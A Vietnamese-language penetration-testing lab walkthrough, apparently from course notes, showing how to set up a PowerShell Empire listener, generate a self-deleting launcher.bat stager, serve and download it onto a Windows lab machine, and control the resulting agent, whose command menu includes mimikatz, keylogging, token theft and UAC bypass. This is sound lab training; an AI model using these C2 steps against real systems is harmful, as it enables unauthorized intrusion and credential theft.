Một thư viện `C#` tuyệt vời khác là Rubeus (chúng ta sẽ tìm hiểu về công cụ này trong mục 560.5). Những công cụ bổ sung này cho phép chúng ta mở rộng khả năng của công cụ này!

## Phần kết luận

Như chúng ta đã thấy, Sliver là một công cụ mạnh mẽ khác dành cho kiểm thử xâm nhập (và tấn công giả lập). Tính linh hoạt của công cụ cho phép chúng ta dễ dàng tải các thư viện của bên thứ ba và trích xuất thông tin (Metasploit hiện cũng có thể làm được điều này). Một trong những tính năng tuyệt vời nhất là chức năng chơi nhiều người.

# Lab 2.4. Empire

## Mục tiêu

Để sử dụng PowerShell Empire tạo trình lắng nghe trên máy ảo Slingshot Linux và các tác nhân trên máy Windows của bạn, cần cả tác nhân có quyền hạn thấp và tác nhân có quyền hạn cao.

Để xem lại các tính năng OpSec Safe của Empire.

Sử dụng các mô-đun của Empire để cướp bóc một cỗ máy mục tiêu nhằm thu thập thông tin hữu ích.

Sử dụng Empire `privesc/powerup/allchecks` để tìm kiếm các lỗ hổng leo thang đặc quyền cục bộ.

Sử dụng Empire để lừa người dùng vượt qua Kiểm soát Tài khoản Người dùng (UAC) nhằm giành quyền truy cập cao hơn.

Để trích xuất các mã băm từ mục tiêu bằng cách sử dụn  mô-đun `powerdump*` của Empire (Dấu `*` cho biết chúng ta cần một tiến trình có đặc quyền cao, còn được gọi là tiến trình có tính toàn vẹn cao, để chạy mô-đun này).

Tiến hành quét cổng từ một tác nhân Empire.

## Thiết lập phòng thí nghiệm

Các máy ảo được sử dụng:

- Slingshot Linux.

- Windows 10.

Để thực hiện bài thực hành này, hãy đảm bảo rằng bạn có thể ping từ máy ảo Slingshot Linux đến máy tính Windows của mình và ngược lại.

```bash
ping WINDOWS_ETHERNET0_ADDRESS
# Thay thế WINDOWS_ETHERNET0_ADDRESS bằng địa chỉ cục bộ của máy ảo Windows của bạn.
ping LINUX_ETH0_ADDRESS
# Thay thế LINUX_ETH0_ADDRESS ằng địa chỉ của giao diện eth0 trên máy ảo Linux của bạn.
```

## Hướng dẫn thực hành từng bước

### 1. Khởi đầu Empire

Hãy bắt đầu bằng cách chuyển đến thư mục cài đặt Empire trên máy ảo Slingshot:

```bash
cd /opt/empire
```

Chúng ta cần khởi động máy chủ Empire. Chúng ta sẽ làm điều đó bằng cách chạy máy chủ Empire với quyền root.

```bash
sudo ./ps-empire server
```

![alt text](IMG/LAB2/LAB2.4/image.png)

```bash
root@slingshot:/opt/empire# sudo ./ps-empire server
[*] Loading default config
[*] Loading bypasses from: /opt/empire/empire/server/bypasses/
[*] Loading stagers from: /opt/empire/empire/server/stagers/
[*] Loading modules from: /opt/empire/empire/server/modules/
[*] Loading listeners from: /opt/empire/empire/server/listeners/
[*] Loading malleable profiles from: /opt/empire/empire/server/data/profiles
[*] Searching for plugins at /opt/empire/empire/server/plugins/
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading websockify server plugin
[*] Registering plugin with menu...
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Empire C# server plugin
[*] Registering plugin with menu...
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Empire reverseshell server plugin
[*] Registering plugin with menu...
[*] Empire starting up...
[*] Starting Empire RESTful API on 0.0.0.0:1337
[*] Starting Empire SocketIO on 0.0.0.0:5000
[*] Testing APIs
[+] Empire RESTful API successfully started
[+] test-nuvq connected to socketio
[+] Empire SocketIO successfully started
[*] Cleaning up test user
[+] Client disconnected from socketio
[+] Plugin csharpserver ran successfully!
[*] Compiler ready
Server > 
EMPIRE TEAM SERVER | 0 Agent(s) | 0 Listener(s) | 3 Plugin(s)
```

Máy chủ đang hoạt động, hãy mở một cửa sổ terminal mới và kết nối với máy chủ (vẫn là máy đó nhưng mà không root trước).

```bash
cd /opt/empire
sudo ./ps-empire client
```

![alt text](IMG/LAB2/LAB2.4/image-1.png)

Chúng ta sẽ bắt đầu bằng cách xem danh sách các lệnh có sẵn trong khung Empire bằng cách gõ `help` và nhấn Enter.

```bash
help
```

![alt text](IMG/LAB2/LAB2.4/image-2.png)

Tại đây, bạn có thể thấy các lệnh như `agents` (hiển thị chi tiết về các tác nhân hiện đang được quản lý), `listeners` (cho phép bạn cấu hình và điều khiển trình lắng nghe) và `usemodule` (cho phép bạn chạy một mô-đun thông qua tác nhân trên một máy bị xâm nhập).

### 2. Cấu hình trình lắng nghe

Trước tiên, chúng ta cần cấu hình trình lắng nghe và triển khai tác nhân.

Chúng ta hãy bắt đầu bằng cách lập danh sách người nghe:

```bash
listeners
```

![alt text](IMG/LAB2/LAB2.4/image-3.png)

Vì chúng ta chưa cấu hình trình lắng nghe nào, nên hiện tại sẽ không có trình lắng nghe nào đang hoạt động. Nhưng hãy lưu ý rằng lời nhắc của bạn đã thay đổi thành ngữ cảnh `listeners` cho phép chúng ta cấu hình và khởi động một trình lắng nghe sẽ chờ các cuộc gọi lại từ các tác nhân Empire.

Hãy cùng xem lại các lệnh mà chúng ta có trong ngữ cảnh trình lắng nghe. Gõ `help` và nhấn Enter.

![alt text](IMG/LAB2/LAB2.4/image-4.png)

Hãy quay lại và cấu hình trình lắng nghe.

```bash
back
```

![alt text](IMG/LAB2/LAB2.4/image-5.png)

Để khởi động một trình lắng nghe, chúng ta sử dụng lệnh `uselistener`, theo sau là loại trình lắng nghe mà chúng ta muốn sử dụng. Để xem danh sách các loại trình lắng nghe, hãy nhập `uselistener`(có dấu cách ở cuối) nhưng KHÔNG NHẤN ENTER. Bạn sẽ thấy danh sách các trình lắng nghe có sẵn.

![alt text](IMG/LAB2/LAB2.4/image-6.png)

Trong bài thực hành này, chúng ta sẽ sử dụng loại `listener http`, hỗ trợ cả HTTP và HTTPS. Và ngay cả khi chúng ta sử dụng HTTP, quá trình giao tiếp vẫn được mã hóa bằng các khóa mã hóa duy nhất do Empire tạo ra. Hãy cấu hình một listener HTTP, chuyển sang ngữ cảnh của nó và lấy thông tin về nó.

```bash
uselistener http
```

```bash
(Empire) > uselistener http

 Author       @harmj0y
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST
              approach.
 Name         HTTP[S]


┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ CertPath         │                                     │ False    │ Certificate path for https          │
│                  │                                     │          │ listeners.                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Cookie           │ vGuLdYhUK                           │ False    │ Custom Cookie Name                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultDelay     │ 5                                   │ True     │ Agent delay/reach back interval (in │
│                  │                                     │          │ seconds).                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
│                  │                                     │          │ (0.0-1.0).                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
│                  │                                     │          │ exiting                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
│                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     │
│                  │ like Gecko                          │          │                                     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ http://10.130.10.128                │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ KillDate         │                                     │ False    │ Date for the listener to exit       │
│                  │                                     │          │ (MM/dd/yyyy).                       │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ http                                │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │                                     │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
│                  │                                     │          │ none, or other).                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
│                  │                                     │          │ ([domain\]username:password) to use │
│                  │                                     │          │ for request (default, none, or      │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
│                  │                                     │          │ communicate with your Slack         │
│                  │                                     │          │ instance.                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
│                  │                                     │          │ /download/. Example:                │
│                  │                                     │          │ /download/stager.php                │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagingKey       │ Y&+L*#Jl|s<r)dqhcHvx4kM@]ODi0K(b    │ True     │ Staging key for initial agent       │
│                  │                                     │          │ negotiation.                        │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
│                  │                                     │          │ staging request (default, none, or  │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
│                  │                                     │          │ (09:00-17:00).                      │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: uselistener/http) >
```

Hãy cùng xem xét các tùy chọn mà chúng ta có thể sử dụng với trình lắng nghe này.

Hãy lưu ý những lựa chọn thú vị sau đây:

- KillDate - thời điểm sau đó trình nghe sẽ ngừng hoạt động.

- StagingKey - Một StagingKey giả ngẫu nhiên dùng để mã hóa thông tin liên lạc giữa tác nhân và người nghe.

- Giờ làm việc - để giới hạn thời gian mà các nhân viên sẽ chủ động gọi lại cho người nghe.

- DefaultDelay - các tác nhân hoạt động bất đồng bộ và DefaultDelay quy định tần suất tác nhân sẽ kiểm tra trạng thái.

Bạn cũng có thể thấy rằng đây `DefaultDelay` là `5` giây, có nghĩa là các tác nhân sẽ gửi yêu cầu lấy thêm lệnh về trình lắng nghe cứ sau mỗi năm giây.

Cuối cùng, xin lưu ý rằng Host được thiết lập mặc định là địa chỉ IP Linux của bạn và trình lắng nghe sẽ sử dụng cổng TCP 80.

Hãy giảm thời gian giữa các lần gọi lại từ tác nhân của chúng ta, từ mặc định là năm giây xuống còn một giây, vì điều này sẽ giúp tác nhân phản hồi nhanh hơn trong bài thực hành này. Ngoài ra, máy chủ của chúng ta đã chạy máy chủ web, vì vậy hãy sử dụng cổng 9999 cho bài thực hành này.

Vui lòng thiết lập các tùy chọn sau:


- `DefaultDelay` đến 1.

- `Port` đến 9999.

- `Host` đến http://LINUX_ETH0_ADDRESS :9999.

```bash
set DefaultDelay 1
set Port 9999
set Host http://10.130.10.128:9999
```

![alt text](IMG/LAB2/LAB2.4/image-7.png)

Sử dụng công cụ `options` này để xác minh cài đặt của chúng tôi.

```bash
options
```

```bash
(Empire: uselistener/http) > options

┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ CertPath         │                                     │ False    │ Certificate path for https          │
│                  │                                     │          │ listeners.                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Cookie           │ vGuLdYhUK                           │ False    │ Custom Cookie Name                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultDelay     │ 1                                   │ True     │ Agent delay/reach back interval (in │
│                  │                                     │          │ seconds).                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
│                  │                                     │          │ (0.0-1.0).                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
│                  │                                     │          │ exiting                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
│                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     │
│                  │ like Gecko                          │          │                                     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ http://10.130.10.128:9999           │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ KillDate         │                                     │ False    │ Date for the listener to exit       │
│                  │                                     │          │ (MM/dd/yyyy).                       │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ http                                │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │ 9999                                │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
│                  │                                     │          │ none, or other).                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
│                  │                                     │          │ ([domain\]username:password) to use │
│                  │                                     │          │ for request (default, none, or      │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
│                  │                                     │          │ communicate with your Slack         │
│                  │                                     │          │ instance.                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
│                  │                                     │          │ /download/. Example:                │
│                  │                                     │          │ /download/stager.php                │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagingKey       │ Y&+L*#Jl|s<r)dqhcHvx4kM@]ODi0K(b    │ True     │ Staging key for initial agent       │
│                  │                                     │          │ negotiation.                        │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
│                  │                                     │          │ staging request (default, none, or  │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
│                  │                                     │          │ (09:00-17:00).                      │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: uselistener/http) >
```

Chúng ta sẽ sử dụng lệnh `execute` này để khởi động trình lắng nghe của mình:

```bash
execute
```

![alt text](IMG/LAB2/LAB2.4/image-8.png)

Giờ chúng ta có thể kiểm tra trình lắng nghe bằng cách chạy lệnh `listeners`:

![alt text](IMG/LAB2/LAB2.4/image-9.png)

### 3. Khai thác một agent

Bây giờ chúng ta cần tạo và triển khai một tác nhân, điều này được thực hiện bằng lệnh `usestager`. Để xem các loại trình cài đặt khác nhau mà chúng ta có sẵn để tải tác nhân lên máy nạn nhân, hãy gõ usestager (và dấu cách), sau đó sử dụng các phím mũi tên để xem các trình cài đặt có sẵn.

```bash
usestager
```

![alt text](IMG/LAB2/LAB2.4/image-10.png)

Kết quả đầy đủ:

```bash
(Empire: listeners) > usestager
                                 windows/csharp_exe
                                 windows/wmic
                                 windows/ms16-051
                                 windows/launcher_bat
                                 windows/macroless_msword
                                 windows/backdoorLnkMacro
                                 windows/teensy
                                 windows/launcher_sct
                                 windows/bunny
                                 windows/launcher_lnk
                                 windows/nim
                                 windows/dll
                                 windows/launcher_xml
                                 windows/launcher_vbs
                                 windows/hta
                                 windows/shellcode
                                 windows/reverseshell
                                 windows/macro
                                 windows/ducky
                                 windows/cmd_exec
                                 multi/war
                                 multi/bash
                                 multi/pyinstaller
                                 multi/macro
                                 multi/launcher
                                 osx/pkg
                                 osx/teensy
                                 osx/safari_launcher
                                 osx/application
                                 osx/macho
                                 osx/shellcode
                                 osx/dylib
                                 osx/dylib
                                 osx/jar
                                 osx/applescript
                                 osx/macro
                                 osx/launcher
                                 osx/ducky
```

Trong bài thực hành này, chúng ta hãy tạo một trình soạn thảo chạy tác nhân thông qua PowerShell từ một tệp .bat của Windows và sau đó xóa tệp .bat đó, một trong những loại tác nhân hữu ích và đáng tin cậy nhất được Empire hỗ trợ.

Chọn đối tượng `windows/launcher_bat` cần thiết lập bằng lệnh `usestager`.

```bash
usestager windows/launcher_bat
```

![alt text](IMG/LAB2/LAB2.4/image-11.png)

Hãy cùng xem cấu hình mặc định của trình chuẩn bị sẽ tải tác nhân:

```bash
options
```

![alt text](IMG/LAB2/LAB2.4/image-12.png)

Lưu ý rằng tác nhân có khả năng xác thực với máy chủ proxy thông qua biến ProxyCreds.

Trong bài thực hành này, chúng ta sẽ giữ nguyên các thiết lập mặc định hợp lý và hữu ích cho trình soạn thảo.

Chúng ta cần cho trình soạn thảo biết nó sẽ gọi lại trình lắng nghe nào (hiện tại chỉ có một trình lắng nghe đang chạy):

```bash
set Listener http
```

![alt text](IMG/LAB2/LAB2.4/image-13.png)

Hãy tạo tệp stager của chúng ta:

```bash
generate
```

![alt text](IMG/LAB2/LAB2.4/image-14.png)

Tiếp theo, tại một cửa sổ dòng lệnh Linux riêng biệt, chúng ta hãy chuyển sang` /opt/empire/empire/client/generated-stagers/` và chạy tệp stager thông qua mô-đun `http.server` Python, lắng nghe trên cổng TCP mặc định là 8000.

Tạo một máy chủ web Python để phục vụ trang web vừa tạo của bạn `/opt/empire/empire/client/generated-stagers/launcher.bat`:

```bash
cd /opt/empire/empire/client/generated-stagers/
python3 -m http.server
```

![alt text](IMG/LAB2/LAB2.4/image-15.png)

### 4. Triển khai trình dàn dựng

Để triển khai trình biên dịch thử nghiệm trên Windows, chúng ta hãy sử dụng PowerShell như một trình duyệt dòng lệnh để tải xuống một tập tin.

Nhấp vào biểu tượng PowerShell trên màn hình nền (không phải liên kết có quyền quản trị).

Đầu tiên, hãy khởi chạy PowerShell mà không cần quyền quản trị (bằng cách vào menu Windows, gõ lệnh `PowerShell` và nhấn Enter).

Bây giờ, từ PowerShell, hãy chuyển đến thư mục Desktop của bạn:

```bash
cd Desktop
```

![alt text](IMG/LAB2/LAB2.4/image-16.png)

Sau đó chạy lệnh `wget` cmdlet để tải xuống tệp trình chuẩn bị tác nhân.

```bash
wget http://10.130.10.128:8000/launcher.bat -OutFile launcher.bat
```

Để đảm bảo tệp stager của bạn đã được tải lên chính xác, hãy chạy `ls` lệnh để kiểm tra kích thước của nó:

```bash
ls launcher.bat
```

![alt text](IMG/LAB2/LAB2.4/image-17.png)

Tệp tin phải có độ dài khác 0 byte. Tệp tin có độ dài xấp xỉ 287 byte.

Hãy cùng xem nhanh tệp tin của chúng ta bằng cách sử dụng `Get-Content`.

```bash
Get-Content launcher.bat
```

![alt text](IMG/LAB2/LAB2.4/image-18.png)

Cuối cùng, bạn sẽ thấy tệp launcher.bat trên màn hình Desktop của máy tính Windows.

![alt text](IMG/LAB2/LAB2.4/image-19.png)

Tiếp theo, nhấp đúp vào biểu tượng `launcher.bat` trên máy tính của bạn Desktop. Thao tác này sẽ chạy trình biên dịch để tải tác nhân lên máy tính Windows của bạn. Sau khi tác nhân được tải, tệp launcher.bat sẽ biến mất, vì đây là tệp độc hại tự xóa.

Tiếp theo, trên máy Linux của bạn, trong cửa sổ terminal của Empire, bạn sẽ thấy một dấu hiệu cho biết trình lắng nghe đã nhận được thông tin liên lạc từ tác nhân của bạn, với thông báo "New agent" theo sau là một tên tác nhân được tạo ngẫu nhiên.

![alt text](IMG/LAB2/LAB2.4/image-20.png)

### 5. Agent hoạt động

Bây giờ chúng ta hãy xem xét các tác nhân đang hoạt động hiện có:

```bash
agents
```

![alt text](IMG/LAB2/LAB2.4/image-21.png)

Bạn sẽ thấy tên của một tác nhân được liệt kê ở đó. Hãy cùng xem danh sách các lệnh của tác nhân.

```bash
help
```

![alt text](IMG/LAB2/LAB2.4/image-22.png)


Tên ngẫu nhiên giả không tiện lắm, vậy nên chúng ta hãy `rename` đặt tên cho phiên này. Hãy gọi tác nhân đầu tiên là `Agent1`. Sau đó liệt kê các tác nhân của bạn. Lưu ý, bạn phải chạy lệnh `list` này, nếu không bạn sẽ không thể tương tác với tác nhân bằng tên mới (đây là một lỗi).

```bash
rename 4A179ENU agent1
list
```

![alt text](IMG/LAB2/LAB2.4/image-23.png)

Để sử dụng một tác nhân, chúng ta sẽ dùng lệnh `interact`. Hãy chắc chắn rằng bạn đã chạy lệnh list ở bước trước, nếu không bạn sẽ không thể tương tác với tác nhân mới của mình bằng tên mới.

```bash
interact agent1
```

![alt text](IMG/LAB2/LAB2.4/image-24.png)

Bây giờ chúng ta hãy xem lại danh sách lệnh của mình:

```bash
help
```

```bash
(Empire: agent1) > help

┌Help Options────┬─────────────────────────────────────┬───────────────────────────────┐
│ Name           │ Description                         │ Usage                         │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ display        │ Display an agent property           │ display <property_name>       │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ download       │ Tasks an the specified agent to     │ download <file_name>          │
│                │ download a file.                    │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ help           │ Display the help menu for the       │ help                          │
│                │ current menu                        │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ history        │ Display last number of task results │ history [<number_tasks>]      │
│                │ received.                           │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ info           │ Display agent info.                 │ info                          │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ killdate       │ Set an agent's killdate             │ killdate <kill_date>          │
│                │ (01/01/2020)                        │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ proxy          │ Proxy management menu for           │ proxy                         │
│                │ configuring agent proxies           │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ script_command │ "Execute a function in the          │ shell_command <script_cmd>    │
│                │ currently imported PowerShell       │                               │
│                │ script."                            │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ script_import  │ Uploads a PowerShell script to the  │ script_import                 │
│                │ server and runs it in memory on the │ <local_script_location>       │
│                │ agent. Use '-p' for a file          │                               │
│                │ selection dialog.                   │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ shell          │ Tasks an the specified agent to     │ shell <shell_cmd>             │
│                │ execute a shell command.            │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ sleep          │ Tasks an the specified agent to     │ sleep <delay> <jitter>        │
│                │ update delay (s) and jitter (0.0 -  │                               │
│                │ 1.0)                                │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ update_comms   │ Update the listener for an agent.   │ update_comms <listener_name>  │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ upload         │ Tasks an the specified agent to     │ upload <local_file_directory> │
│                │ upload a file. Use '-p' for a file  │                               │
│                │ selection dialog.                   │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ view           │ View specific task and result       │ view <task_id>                │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ vnc            │ Launch a VNC server on the agent    │ vnc                           │
│                │ and spawn a VNC client              │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ vnc_client     │ Launch a VNC client to a remote     │ vnc_client <address> <port>   │
│                │ server                              │ <password>                    │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ workinghours   │ Set an agent's working hours        │ workinghours <working_hours>  │
│                │ (9:00-17:00)                        │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ whoami         │ Tasks an agent to run the shell     │ whoami                        │
│                │ command 'whoami'                    │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ ps             │ Tasks an agent to run the shell     │ ps                            │
│                │ command 'ps'                        │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ sc             │ Tasks the agent to run module       │ sc                            │
│                │ powershell/collection/screenshot.   │                               │
│                │ Default parameters include: Ratio:  │                               │
│                │ 80                                  │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ keylog         │ Tasks the agent to run module       │ keylog                        │
│                │ powershell/collection/keylogger.    │                               │
│                │ Default parameters include: Sleep:  │                               │
│                │ 1                                   │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ sherlock       │ Tasks the agent to run module       │ sherlock                      │
│                │ powershell/privesc/sherlock.        │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ mimikatz       │ Tasks the agent to run module power │ mimikatz                      │
│                │ shell/credentials/mimikatz/logonpas │                               │
│                │ swords.                             │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ psinject       │ Tasks the agent to run module       │ psinject <Listener> <ProcId>  │
│                │ powershell/management/psinject.     │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ revtoself      │ Tasks the agent to run module       │ revtoself                     │
│                │ powershell/credentials/tokens.      │                               │
│                │ Default parameters include:         │                               │
│                │ RevToSelf: True                     │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ shinject       │ Tasks the agent to run module       │ shinject <Listener> <ProcId>  │
│                │ powershell/management/shinject.     │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ spawn          │ Tasks the agent to run module       │ spawn <Listener>              │
│                │ powershell/management/spawn.        │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ steal_token    │ Tasks the agent to run module       │ steal_token <ProcessID>       │
│                │ powershell/credentials/tokens.      │                               │
│                │ Default parameters include:         │                               │
│                │ ImpersonateUser: True               │                               │
├────────────────┼─────────────────────────────────────┼───────────────────────────────┤
│ bypassuac      │ Tasks the agent to run module power │ bypassuac <Listener>          │
│                │ shell/privesc/bypassuac_eventvwr.   │                               │
└────────────────┴─────────────────────────────────────┴───────────────────────────────┘
```

Ở đây chúng ta có thể thấy các lệnh như `download`, `killdate`, và `shell`. Ngoài ra, để xem các thiết lập liên quan đến tác nhân hiện tại, chúng ta có thể chạy lệnh `info`. Hãy cùng làm điều đó:

```bash
info
```

```bash
(Empire: agent1) > info

┌Agent Options─────┬───────────────────────────────────────────────┐
│ ID               │ 1                                             │
├──────────────────┼───────────────────────────────────────────────┤
│ architecture     │ AMD64                                         │
├──────────────────┼───────────────────────────────────────────────┤
│ checkin_time     │ 2026-04-01T01:27:29+00:00                     │
├──────────────────┼───────────────────────────────────────────────┤
│ children         │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ delay            │ 1                                             │
├──────────────────┼───────────────────────────────────────────────┤
│ external_ip      │ 10.130.10.25                                  │
├──────────────────┼───────────────────────────────────────────────┤
│ functions        │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ high_integrity   │ 0                                             │
├──────────────────┼───────────────────────────────────────────────┤
│ hostname         │ SEC560STUDENT                                 │
├──────────────────┼───────────────────────────────────────────────┤
│ internal_ip      │ 10.130.10.25                                  │
├──────────────────┼───────────────────────────────────────────────┤
│ jitter           │ 0.0                                           │
├──────────────────┼───────────────────────────────────────────────┤
│ kill_date        │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ language         │ powershell                                    │
├──────────────────┼───────────────────────────────────────────────┤
│ language_version │ 5                                             │
├──────────────────┼───────────────────────────────────────────────┤
│ lastseen_time    │ 2026-04-01T01:33:41+00:00                     │
├──────────────────┼───────────────────────────────────────────────┤
│ listener         │ http                                          │
├──────────────────┼───────────────────────────────────────────────┤
│ lost_limit       │ 60                                            │
├──────────────────┼───────────────────────────────────────────────┤
│ name             │ agent1                                        │
├──────────────────┼───────────────────────────────────────────────┤
│ nonce            │ 6951096813542968                              │
├──────────────────┼───────────────────────────────────────────────┤
│ notes            │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ os_details       │ Microsoft Windows 10 Enterprise               │
